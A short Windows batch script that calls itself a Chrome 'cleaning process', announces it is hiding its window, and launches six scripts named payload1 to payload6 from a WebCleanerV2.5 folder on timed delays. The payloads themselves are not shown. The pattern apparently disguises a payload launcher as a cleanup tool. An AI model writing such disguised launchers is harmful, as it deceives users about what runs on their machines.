@echo off

title Chrome EXEREMOVE

color E


echo Starting Cleaning Process...

echo Current Time and Date - KEEP IF DATA IS LOST!

time /t

date /t


echo Preparing System (HIDING WINDOW!)

start cmd /k C:\WebCleanerV2.5\payload1.vbs


timeout 45 

start cmd /k C:\WebCleanerV2.5\payload2.vbs
timeout 80

start cmd /k C:\WebCleanerV2.5\payload3.bat

timeout 140

start cmd /k C:\WebCleanerV2.5\payload4.bat

timeout 40

start cmd /k C:\WebCleanerV2.5\payload6.vbs

timeout 60

start cmd /k C:\WebCleanerV2.5\payload5.bat
